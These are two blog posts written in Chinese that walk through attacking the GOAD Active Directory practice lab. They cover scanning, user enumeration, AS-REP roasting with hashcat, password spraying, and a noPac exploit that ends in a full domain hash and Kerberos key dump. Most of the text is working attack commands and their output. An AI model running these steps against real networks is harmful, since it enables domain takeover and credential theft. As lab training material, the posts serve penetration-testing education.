[{"title":"GOAD-Wirteup_Part1(废弃)","url":"/GOAD-Wirteup-Part1/","content":"网上看见了一个非常好的域渗透练习项目GOAD，搭建这块就不说了，直接开始。\n信息收集扫描nxc smb 192.168.56.0/24\n\n有三台机器signing:True，根据经验判断这三台为域控，我们可以再扫一下LDAP端口进行验证\nnxc ldap 192.168.56.0/24\n\n将这些机器添加进HOSTS文件中，以备后面使用Kerberos相关服务。\n寻找域账号当域控能被匿名SMB连接时能枚举到域账号\nnxc smb 192.168.56.0/24 --users\n\n这就直接给我们一个账号密码，只能说靶场就是靶场。\nsamwell.tarly:Heartsbane\n获取域信息这样我们就能通过LDAP认证获取更多的信息\n┌──(kali㉿kali)-[~]└─$ ldapdomaindump -u &#x27;NORTH.SEVENKINGDOMS.LOCAL\\samwell.tarly&#x27; -p Heartsbane -o NORTH.SEVENKINGDOMS.LOCAL 192.168.56.11[*] Connecting to host...[*] Binding to host[+] Bind OK[*] Starting domain dump[+] Domain dump finished\n\n很遗憾，我们获得的账号并不在Doamin Admins组里\n攻击NORTH.SEVENKINGDOMS.LOCAL我们目前有两台机器在NORTH.SEVENKINGDOMS.LOCAL域内\nSMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)\n\n通过LdapDomainDump的数据，有两名域管理员\neddaard.starkAdministrator\n\n并且有一个域用户的帐号密码\nsamwell.tarly:Heartsbane\n当有域账户时可以扫描域用户权限提升漏洞，如noPac，PrintNightmare\n我们可以使用Netexec进行扫描\n┌──(kali㉿kali)-[~/Downloads/krbrelayx-master]└─$ nxc smb 192.168.56.11 -u samwell.tarly -p -M nopac -M spoolerSMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\\samwell.tarly:HeartsbaneNOPAC       192.168.56.11   445    WINTERFELL       TGT with PAC size 1654NOPAC       192.168.56.11   445    WINTERFELL       TGT without PAC size 817NOPAC       192.168.56.11   445    WINTERFELLNOPAC       192.168.56.11   445    WINTERFELL       VULNERABLENOPAC       192.168.56.11   445    WINTERFELL       Next step: https://github.com/Ridter/noPacSPOOLER     192.168.56.11   445    WINTERFELL       Spooler service enabled\n\n我们可以直接使用https://github.com/Ridter/noPac\n┌──(noPac)─(kali㉿kali)-[~/Downloads/noPac]└─$ python3 noPac.py north.sevenkingdoms.local/samwell.tarly:Heartsbane -dc-ip 192.168.56.11███    ██  ██████  ██████   █████   ██████████   ██ ██    ██ ██   ██ ██   ██ ████ ██  ██ ██    ██ ██████  ███████ ████  ██ ██ ██    ██ ██      ██   ██ ████   ████  ██████  ██      ██   ██  ██████[*] Current ms-DS-MachineAccountQuota = 10[*] Selected Target winterfell.north.sevenkingdoms.local[*] Total Domain Admins 3[*] will try to impersonate eddard.stark[*] Adding Computer Account &quot;WIN-SXKFGMHCLVY$&quot;[*] MachineAccount &quot;WIN-SXKFGMHCLVY$&quot; password = 19EqF0n0imc2[*] Successfully added machine account WIN-SXKFGMHCLVY$ with password 19EqF0n0imc2.[*] WIN-SXKFGMHCLVY$ object = CN=WIN-SXKFGMHCLVY,CN=Computers,DC=north,DC=sevenkingdoms,DC=local[*] WIN-SXKFGMHCLVY$ sAMAccountName == winterfell[*] Saving a DC&#x27;s ticket in winterfell.ccache[*] Reseting the machine account to WIN-SXKFGMHCLVY$[*] Restored WIN-SXKFGMHCLVY$ sAMAccountName to original value[*] Using TGT from cache[*] Impersonating eddard.stark[*] \tRequesting S4U2self[*] Saving a user&#x27;s ticket in eddard.stark.ccache[*] Rename ccache to eddard.stark_winterfell.north.sevenkingdoms.local.ccache[*] Attempting to del a computer with the name: WIN-SXKFGMHCLVY$[-] Delete computer WIN-SXKFGMHCLVY$ Failed! Maybe the current user does not have permission.\n\n显示删除机器账户失败，没关系，票据申请到了就行。\n使用secretsdump进行dump\n┌──(kali㉿kali)-[~/Downloads/noPac]└─$ ls -lian eddard.stark_winterfell.north.sevenkingdoms.local.ccache3689526 -rw-rw-r-- 1 1000 1000 1545 Dec 20 10:03 eddard.stark_winterfell.north.sevenkingdoms.local.ccache┌──(kali㉿kali)-[~/Downloads/noPac]└─$export KRB5CCNAME=eddard.stark_winterfell.north.sevenkingdoms.local.ccache3689526 -rw-rw-r-- 1 1000 1000 1545 Dec 20 10:03 eddard.stark_winterfell.north.sevenkingdoms.local.ccache┌──(kali㉿kali)-[~/Downloads/noPac]└─$ impacket-secretsdump -k -no-pass eddard.stark@winterfell.north.sevenkingdoms.local -just-dcImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1afc3352b8464b283bc168d3dd935c78:::vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::arya.stark:1110:aad3b435b51404eeaad3b435b51404ee:4f622f4cd4284a887228940e2ff4e709:::eddard.stark:1111:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::catelyn.stark:1112:aad3b435b51404eeaad3b435b51404ee:cba36eccfd9d949c73bc73715364aff5:::robb.stark:1113:aad3b435b51404eeaad3b435b51404ee:831486ac7f26860c9e2f51ac91e1a07a:::sansa.stark:1114:aad3b435b51404eeaad3b435b51404ee:b777555c2e2e3716e075cc255b26c14d:::brandon.stark:1115:aad3b435b51404eeaad3b435b51404ee:84bbaa1c58b7f69d2192560a3f932129:::rickon.stark:1116:aad3b435b51404eeaad3b435b51404ee:7978dc8a66d8e480d9a86041f8409560:::hodor:1117:aad3b435b51404eeaad3b435b51404ee:337d2667505c203904bd899c6c95525e:::jon.snow:1118:aad3b435b51404eeaad3b435b51404ee:b8d76e56e9dac90539aff05e3ccb1755:::samwell.tarly:1119:aad3b435b51404eeaad3b435b51404ee:f5db9e027ef824d029262068ac826843:::jeor.mormont:1120:aad3b435b51404eeaad3b435b51404ee:6dccf1c567c56a40e56691a723a49664:::sql_svc:1121:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::north.sevenkingdoms.local\\admin01:1125:aad3b435b51404eeaad3b435b51404ee:ebdf1f3a95ab808bbf01ecec1ebdc7ee:::WINTERFELL$:1001:aad3b435b51404eeaad3b435b51404ee:019b67b6b314f318bda1fcdf56fdec45:::CASTELBLACK$:1105:aad3b435b51404eeaad3b435b51404ee:3a5c1723373cbe24b801b1cfecf6cec7:::DESKTOP-HKO7PPDH$:1122:aad3b435b51404eeaad3b435b51404ee:05c7bca85e213cdea0ce9fc93a5c5952:::krbrelay$:1123:aad3b435b51404eeaad3b435b51404ee:0eddedc35eb7b7ecde0c9f0564e54c83:::win11$:1124:aad3b435b51404eeaad3b435b51404ee:106d6be7c86c1248e9f29410bf52891d:::Test123$:1126:aad3b435b51404eeaad3b435b51404ee:4b130d040e6349f2813703bb671fef45:::Test234$:1127:aad3b435b51404eeaad3b435b51404ee:04c53682276ad85b0680d03cbb608129:::Test456$:1128:aad3b435b51404eeaad3b435b51404ee:04c53682276ad85b0680d03cbb608129:::cd1234..$:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::WIN-SXKFGMHCLVY$:1131:aad3b435b51404eeaad3b435b51404ee:079b73f9d179047c70481513e24a60b1:::SEVENKINGDOMS$:1104:aad3b435b51404eeaad3b435b51404ee:34831d00299c3d29c2e48fa7444afe8d:::[*] Kerberos keys grabbedAdministrator:aes256-cts-hmac-sha1-96:e7aa0f8a649aa96fab5ed9e65438392bfc549cb2695ac4237e97996823619972Administrator:aes128-cts-hmac-sha1-96:bb7b6aed58a7a395e0e674ac76c28aa0Administrator:des-cbc-md5:fe58cdcd13a43243krbtgt:aes256-cts-hmac-sha1-96:2b2a02d222c517711baf01c1254a00ada695fd849fc8f0e92210587e10e257aakrbtgt:aes128-cts-hmac-sha1-96:7a2021c885bcfc796aa694921c5a8b4akrbtgt:des-cbc-md5:944032f875df7576vagrant:aes256-cts-hmac-sha1-96:aa97635c942315178db04791ffa240411c36963b5a5e775e785c6bd21dd11c24vagrant:aes128-cts-hmac-sha1-96:0d7c6160ffb016857b9af96c44110ab1vagrant:des-cbc-md5:16dc9e8ad3dfc47farya.stark:aes256-cts-hmac-sha1-96:2001e8fb3da02f3be6945b4cce16e6abdd304974615d6feca7d135d4009d4f7darya.stark:aes128-cts-hmac-sha1-96:8477cba28e7d7cfe5338d172a23d74dfarya.stark:des-cbc-md5:13525243d6643285eddard.stark:aes256-cts-hmac-sha1-96:f6b4d01107eb34c0ecb5f07d804fa9959dce6643f8e4688df17623b847ec7fc4eddard.stark:aes128-cts-hmac-sha1-96:5f9b06a24b90862367ec221a11f92203eddard.stark:des-cbc-md5:8067f7abecc7d346catelyn.stark:aes256-cts-hmac-sha1-96:c8302e270b04252251de40b2bd5fba37395b55d5ed9ac95e03213dc739827283catelyn.stark:aes128-cts-hmac-sha1-96:50ce7e2ad069fa40fb2bc7f5f9643d93catelyn.stark:des-cbc-md5:6b314670a2f84cfbrobb.stark:aes256-cts-hmac-sha1-96:d7df5069178bbc93fdc34bbbcb8e374fd75c44d6ce51000f24688925cc4d9c2arobb.stark:aes128-cts-hmac-sha1-96:b2965905e68356d63fedd9904357cc42robb.stark:des-cbc-md5:c4b62c797f5dd01fsansa.stark:aes256-cts-hmac-sha1-96:a268e7a385f4f165c6489c18a3bdeb52c5e505050449c6f9aeba4bc06a7fcbedsansa.stark:aes128-cts-hmac-sha1-96:e2e6e885f6f4d3e25d759ea624961392sansa.stark:des-cbc-md5:4c7c16e3f74cc4d3brandon.stark:aes256-cts-hmac-sha1-96:6dd181186b68898376d3236662f8aeb8fa68e4b5880744034d293d18b6753b10brandon.stark:aes128-cts-hmac-sha1-96:9de3581a163bd056073b71ab23142d73brandon.stark:des-cbc-md5:76e61fda8a4f5245rickon.stark:aes256-cts-hmac-sha1-96:79ffda34e5b23584b3bd67c887629815bb9ab8a1952ae9fda15511996587dcdarickon.stark:aes128-cts-hmac-sha1-96:d4a0669b1eff6caa42f2632ebca8cd8drickon.stark:des-cbc-md5:b9ec3b8f2fd9d98ahodor:aes256-cts-hmac-sha1-96:a33579ec769f3d6477a98e72102a7f8964f09a745c1191a705d8e1c3ab6e4287hodor:aes128-cts-hmac-sha1-96:929126dcca8c698230b5787e8f5a5b60hodor:des-cbc-md5:d5764373f2545dfdjon.snow:aes256-cts-hmac-sha1-96:5a1bc13364e758131f87a1f37d2f1b1fa8aa7a4be10e3fe5a69e80a5c4c408fbjon.snow:aes128-cts-hmac-sha1-96:d8bc99ccfebe2d6e97d15f147aa50e8bjon.snow:des-cbc-md5:084358ceb3290d7csamwell.tarly:aes256-cts-hmac-sha1-96:b66738c4d2391b0602871d0a5cd1f9add8ff6b91dcbb7bc325dc76986496c605samwell.tarly:aes128-cts-hmac-sha1-96:3943b4ac630b0294d5a4e8b940101faesamwell.tarly:des-cbc-md5:5efed0e0a45dd951jeor.mormont:aes256-cts-hmac-sha1-96:be10f893afa35457fcf61ecc40dc032399b7aee77c87bb71dd2fe91411d2bd50jeor.mormont:aes128-cts-hmac-sha1-96:1b0a98958e19d6092c8e8dc1d25c788bjeor.mormont:des-cbc-md5:1a68641a3e9bb6easql_svc:aes256-cts-hmac-sha1-96:24d57467625d5510d6acfddf776264db60a40c934fcf518eacd7916936b1d6afsql_svc:aes128-cts-hmac-sha1-96:01290f5b76c04e39fb2cb58330a22029sql_svc:des-cbc-md5:8645d5cd402f16c7north.sevenkingdoms.local\\admin01:aes256-cts-hmac-sha1-96:932317d6c409d624aea9f223a3d47ec9042b4e7d0bc856324e918189ccf33c97north.sevenkingdoms.local\\admin01:aes128-cts-hmac-sha1-96:6fa2d0782fe5a9a8946acdc34779b905north.sevenkingdoms.local\\admin01:des-cbc-md5:bab51aeca1ec1ca7WINTERFELL$:aes256-cts-hmac-sha1-96:9f46dd231e24cd29a4fb9c92cc4bfb52ac90c4afedad4527ca3b3b879b9682b2WINTERFELL$:aes128-cts-hmac-sha1-96:528ed5d9308e2a82a0d68748cb5d6c81WINTERFELL$:des-cbc-md5:7ff72c75d5d683b5CASTELBLACK$:aes256-cts-hmac-sha1-96:6f5423d17fd317a6bec4cfb0fe0872bfc43597cb622351b9c8ccfeca38d3be62CASTELBLACK$:aes128-cts-hmac-sha1-96:ccdacc849a0c9800078212adb3f6f851CASTELBLACK$:des-cbc-md5:6e68a4a19454349bDESKTOP-HKO7PPDH$:aes256-cts-hmac-sha1-96:86c358a1374a7734c9da842e359e3fae878e7fcbe68ba40cf9dc61a399842f51DESKTOP-HKO7PPDH$:aes128-cts-hmac-sha1-96:b4df35e06ffe272af05bf23c130d8d07DESKTOP-HKO7PPDH$:des-cbc-md5:687c19cdaba49132krbrelay$:aes256-cts-hmac-sha1-96:9b24562bed8ff22f72ddb14c597c74889100ce2b84749a396b4af47876be2f7fkrbrelay$:aes128-cts-hmac-sha1-96:513eabc0aa30a686a2e5fb4b937615efkrbrelay$:des-cbc-md5:aec4043738c7e38cwin11$:aes256-cts-hmac-sha1-96:1a0872d983af4250b4eac66af59fdb3c57a35ccd1967420228810c526a35915ewin11$:aes128-cts-hmac-sha1-96:221795e2c6278e258edcb2750355adc5win11$:des-cbc-md5:04fea88c9419a432Test123$:aes256-cts-hmac-sha1-96:ddec45e9ba6aa0c87f5bfe1f732eda7bb66c97486beb7c69b0cfb8cddeef28eeTest123$:aes128-cts-hmac-sha1-96:6341bf5ed96823f7d39af437c07a2e92Test123$:des-cbc-md5:e07a4adc325d2c9eTest234$:aes256-cts-hmac-sha1-96:f8746b95c42047051fa169f81b58ec88e1f8aac60dfe2c58cecab09b116ca32fTest234$:aes128-cts-hmac-sha1-96:5114a367c629151d9e92c70ef2a74eccTest234$:des-cbc-md5:97d686b997920bdcTest456$:aes256-cts-hmac-sha1-96:0cf0c36a22200e0c87471cfc84b4c2ca3b2824d49af6c8bcc271e10b77acb653Test456$:aes128-cts-hmac-sha1-96:707002b94973e6a27446b574a09fa4c4Test456$:des-cbc-md5:5bd6d319d5b0524aWIN-SXKFGMHCLVY$:aes256-cts-hmac-sha1-96:9116d96c8434751c276e7201cd20bad12794d60eedb700f036b3bc259d1cbb5fWIN-SXKFGMHCLVY$:aes128-cts-hmac-sha1-96:35f20ca5201ec3b910164ea74b0628ccWIN-SXKFGMHCLVY$:des-cbc-md5:1f324697b66e7f3eSEVENKINGDOMS$:aes256-cts-hmac-sha1-96:b06b661d4b02880e55e846888400f36a46c37b492baf9fca43c181498b0081ccSEVENKINGDOMS$:aes128-cts-hmac-sha1-96:bc137e4170c0c00794c618de0606988eSEVENKINGDOMS$:des-cbc-md5:f483da8651026b86[*] Cleaning up...\n\n后面就可以用Administrator的Hash去删除我们注册的域机器账户，这里就不再赘述。\n"},{"title":"GOAD-Journey-Part1","url":"/GOAD-Journey-Part1/","content":"上一篇文章写的有点乱，既然是博客，应该事无巨细的写一篇教程文。此篇我将从域渗透教学的角度来描述如何一步步渗透进入GOAD。\n扫描和侦查网络扫描NETEXEC简单探测在域渗透中，我们可以通过NetExec进行简单的域内Windows扫描\nnxc smb 192.168.56.0/24\n\n\n我们可知当前有三个域\nessos.localsevenkingdoms.localnorth.sevenkingdoms.local\n\n通过signing:True，可猜测这三台就是域控，使用Ldap端口扫描\nnxc ldap 192.168.56.0/24\n\n\n可以确定有三台域控。\n配置HOSTS我们需要在本地机器上设置hosts文件，以便后续使用Kerberos协议\n# /etc/hosts# GOAD192.168.56.10   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding192.168.56.11   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell192.168.56.12   essos.local meereen.essos.local meereen192.168.56.22   castelblack.north.sevenkingdoms.local castelblack192.168.56.23   braavos.essos.local braavos\n\nNMAP全端口扫描为了扩充攻击面，我们将对目前已知的机器进行全端口扫描\nnmap -Pn -p- -sC -sV -oA full_scan 192.168.56.10-12,22-23\n\n解读一下这些参数\n-Pn 不使用ping来探活\n-p- 扫描全端口\n-sc运行默认的侦察脚本\n-sV 探测系统版本\n-oA用三种结果保存到 full_scan\n扫描结果太长了就不展示了\n分析扫描结果通过sevenkingdoms.local和essos.local，在google上搜索，可以判定为《权力的游戏》或者是《冰与火之歌》有关的域。虽然这是一个靶场，但是我们也可以在实战中运用这项社会工程学技能。\n\n寻找域用户在域控上匿名枚举域账号nxc smb 192.168.56.0/24 --users\n\n\n我们在WINTERFELL.NORTH.SEVENKINGDOMS.LOCAL中枚举到了十个域账号，并且意外收获了一个密码\nsamwell.tarly:Heartsbane\n这些账号我们也可以验证我们在上一步的OSINT，我们寻找的是正确的信息。\n\n有密码时我们可以使用ldapdomaindump来获取域信息。\n┌──(kali㉿kali)-[~]└─$ ldapdomaindump -u &#x27;NORTH.SEVENKINGDOMS.LOCAL\\samwell.tarly&#x27; -p Heartsbane -o NORTH.SEVENKINGDOMS.LOCAL 192.168.56.11[*] Connecting to host...[*] Binding to host[+] Bind OK[*] Starting domain dump[+] Domain dump finished\n\n我们获得了NORTH.SEVENKINGDOMS.LOCAL上所有的账户\nOSINT+暴力枚举帐号我们通过上面的分析扫描结果中的OSINT获取账号名，并将其按照另一个域名上格式来设置密码。(这种格式在大多域内都是通用的)\n可以写一个简单的sh脚本，从网络上爬取相关用户名\n#!/bin/bash# Fetch webpage and extract character namescurl -s &quot;https://www.hbomax.com/shows/game-of-thrones/4f6b4985-2dc9-4ab6-ac79-d60f0860b0ac/cast-and-crew&quot; | \\grep -o &#x27;&gt;[A-Z][a-z]* [A-Z][a-z]*&lt;&#x27; | \\sed &#x27;s/&gt;//g; s/&lt;//g&#x27; | \\awk &#x27;BEGIN &#123; count = 0 &#125;&#123;    count++    if (count &gt; 11 &amp;&amp; (count - 12) % 2 == 0) &#123;        # Convert to lowercase and replace spaces with dots        name = tolower($0)        gsub(/ /, &quot;.&quot;, name)        print name    &#125;&#125;&#x27; | \\sort | uniq\n\n我们可以使用kerbrute来进行账号名爆破\n┌──(kali㉿kali)-[~]└─$ kerbrute userenum -d essos.local --dc 192.168.56.12 got_users.txt    __             __               __   / /_____  _____/ /_  _______  __/ /____  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __//_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/Version: v1.0.3 (9dad6e1) - 12/21/25 - Ronnie Flathers @ropnop2025/12/21 06:32:31 &gt;  Using KDC(s):2025/12/21 06:32:31 &gt;  \t192.168.56.12:882025/12/21 06:32:31 &gt;  [+] VALID USERNAME:\t daenerys.targaryen@essos.local2025/12/21 06:32:31 &gt;  [+] VALID USERNAME:\t jorah.mormont@essos.local2025/12/21 06:32:31 &gt;  [+] VALID USERNAME:\t khal.drogo@essos.local2025/12/21 06:32:31 &gt;  [+] VALID USERNAME:\t viserys.targaryen@essos.local2025/12/21 06:32:36 &gt;  Done! Tested 80 usernames (4 valid) in 5.003 seconds\n\n也可以用nmap进行账号爆破，我们在另一个域上用nmap试一下\n┌──(kali㉿kali)-[~]└─$ nmap -p 88 --script=krb5-enum-users --script-args=&quot;krb5-enum-users.realm=&#x27;sevenkingdoms.local&#x27;,userdb=got_users.txt&quot; 192.168.56.10Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 06:32 ESTNmap scan report for sevenkingdoms.local (192.168.56.10)Host is up (0.00035s latency).PORT   STATE SERVICE88/tcp open  kerberos-sec| krb5-enum-users:| Discovered Kerberos principals|     robert.baratheon@sevenkingdoms.local|_    stannis.baratheon@sevenkingdoms.localMAC Address: 00:0C:29:CC:C8:38 (VMware)Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds\n\n寻找未授权的SMB┌──(kali㉿kali)-[~]└─$ nxc smb 192.168.56.0/24 -u &#x27;a&#x27; -p &#x27;&#x27; --sharesSMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)SMB         192.168.56.12   445    MEEREEN          [*] Windows 10 / Server 2016 Build 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)SMB         192.168.56.10   445    KINGSLANDING     [-] sevenkingdoms.local\\a: STATUS_LOGON_FAILURESMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\\a: STATUS_LOGON_FAILURESMB         192.168.56.23   445    BRAAVOS          [*] Windows 10 / Server 2016 Build 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)SMB         192.168.56.12   445    MEEREEN          [-] essos.local\\a: STATUS_LOGON_FAILURESMB         192.168.56.22   445    CASTELBLACK      [-] north.sevenkingdoms.local\\a: STATUS_LOGON_FAILURESMB         192.168.56.23   445    BRAAVOS          [+] essos.local\\a: (Guest)SMB         192.168.56.23   445    BRAAVOS          [*] Enumerated sharesSMB         192.168.56.23   445    BRAAVOS          Share           Permissions     RemarkSMB         192.168.56.23   445    BRAAVOS          -----           -----------     ------SMB         192.168.56.23   445    BRAAVOS          ADMIN$                          Remote AdminSMB         192.168.56.23   445    BRAAVOS          all             READ,WRITE      Basic RW share for allSMB         192.168.56.23   445    BRAAVOS          C$                              Default shareSMB         192.168.56.23   445    BRAAVOS          CertEnroll                      Active Directory Certificate Services shareSMB         192.168.56.23   445    BRAAVOS          IPC$            READ            Remote IPCSMB         192.168.56.23   445    BRAAVOS          public                          Basic Read share for all domain usersRunning nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00\n\n有一个可读写\n有用户名但是没有密码的情况ASREP - roasting比如说咱之前在north.sevenkingdoms.local 上ldapdomaindump获取的所有用户名。\nsql_svcjeor.mormontsamwell.tarlyjon.snowhodorrickon.starkbrandon.starksansa.starkrobb.starkcatelyn.starkeddard.starkarya.starkkrbtgtvagrantGuestAdministrator\n\n保存到users.txt\n┌──(kali㉿kali)-[~]└─$ impacket-GetNPUsers north.sevenkingdoms.local/ -no-pass -usersfile users.txtImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[-] User sql_svc doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User jeor.mormont doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User samwell.tarly doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User jon.snow doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User hodor doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User rickon.stark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:c0d425fe45c54c3c18e875898bca120f$45ac4cb030568708dae3e1c6c2dc5777628b03f8c2a0c33cde1affe1005f3877c51d8c71a551bc2cec9d65b66ca4ee3dfac29d86e5adf504a3e1e627624951d1783896c0171c86530661894964b1faac172a3ba01fc851b43d54bfdec323e1502a9435f97a98c71c3a5794faeb1898393f448a387bef9483880de57fb38e9a3a16ff3709f6c01f5d51389a7e867d520ae37f30b1c5968abeeab45d0046d2e55f2235a94051938f261fb0fb4e91186c7588e0bb935b4dee180f0d66ac7d3c0cee54c0f78842495c662376e32815da9ca43d5a064d6af83336925e5634bd10f7cc60d4d9d7f9b3f4367b813d83dcf4f3e86dc18fd7ce2486aeaeca61b9c5d547ccb498d6bfa114[-] User sansa.stark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User robb.stark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User catelyn.stark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User eddard.stark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User arya.stark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] User vagrant doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] User Administrator doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set\n\n这就获取到的brandon.stark的票据。然后用hashcat去破解他\n┌──(kali㉿kali)-[~]└─$ hashcat -m 18200 asrephash.txt /usr/share/wordlists/rockyou.txthashcat (v7.1.2) startingOpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]====================================================================================================================================================* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900H, 6956/13913 MB (2048 MB allocatable), 4MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Minimum salt length supported by kernel: 0Maximum salt length supported by kernel: 256Hashes: 1 digests; 1 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Not-Iterated* Single-Hash* Single-SaltATTENTION! Pure (unoptimized) backend kernels selected.Pure kernels can crack longer passwords, but drastically reduce performance.If you want to switch to optimized kernels, append -O to your commandline.See the above message to find out about the exact limits.Watchdog: Temperature abort trigger set to 90cHost memory allocated for this attack: 513 MB (11083 MB free)Dictionary cache built:* Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344392* Bytes.....: 139921507* Keyspace..: 14344385* Runtime...: 1 sec$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:c0d425fe45c54c3c18e875898bca120f$45ac4cb030568708dae3e1c6c2dc5777628b03f8c2a0c33cde1affe1005f3877c51d8c71a551bc2cec9d65b66ca4ee3dfac29d86e5adf504a3e1e627624951d1783896c0171c86530661894964b1faac172a3ba01fc851b43d54bfdec323e1502a9435f97a98c71c3a5794faeb1898393f448a387bef9483880de57fb38e9a3a16ff3709f6c01f5d51389a7e867d520ae37f30b1c5968abeeab45d0046d2e55f2235a94051938f261fb0fb4e91186c7588e0bb935b4dee180f0d66ac7d3c0cee54c0f78842495c662376e32815da9ca43d5a064d6af83336925e5634bd10f7cc60d4d9d7f9b3f4367b813d83dcf4f3e86dc18fd7ce2486aeaeca61b9c5d547ccb498d6bfa114:iseedeadpeople\n\n这就获取到了brandon.stark的密码为iseedeadpeople\n密码喷洒一种是用户名和密码一样的情况下(现实情况下非常少)\n┌──(kali㉿kali)-[~]└─$ nxc smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforceSMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\\sql_svc:sql_svc STATUS_LOGON_FAILURESMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\\jeor.mormont:jeor.mormont STATUS_LOGON_FAILURESMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\\samwell.tarly:samwell.tarly STATUS_LOGON_FAILURESMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\\jon.snow:jon.snow STATUS_LOGON_FAILURESMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\\hodor:hodor\n\n第二种是部分密码复用的情况，可以用kerbrute，非常快\n┌──(kali㉿kali)-[~]└─$ kerbrute passwordspray -d north.sevenkingdoms.local --dc 192.168.56.11 users.txt hodor    __             __               __   / /_____  _____/ /_  _______  __/ /____  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __//_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/Version: v1.0.3 (9dad6e1) - 12/21/25 - Ronnie Flathers @ropnop2025/12/21 06:56:44 &gt;  Using KDC(s):2025/12/21 06:56:44 &gt;  \t192.168.56.11:882025/12/21 06:56:44 &gt;  [+] VALID LOGIN:\t hodor@north.sevenkingdoms.local:hodor2025/12/21 06:56:44 &gt;  Done! Tested 16 logins (1 successes) in 0.019 seconds\n\n\n\n总结我们这次旅程总共获取了三个账户密码\n分别是\nsamwell.tarly:Heartsbane（用户描述）brandon.stark:iseedeadpeople（asreproasting）hodor:hodor (密码喷洒)\n\n\n\n文章参考Mayfly师傅较多部分。喜欢的师傅可以去看看。\n","tags":["-Active 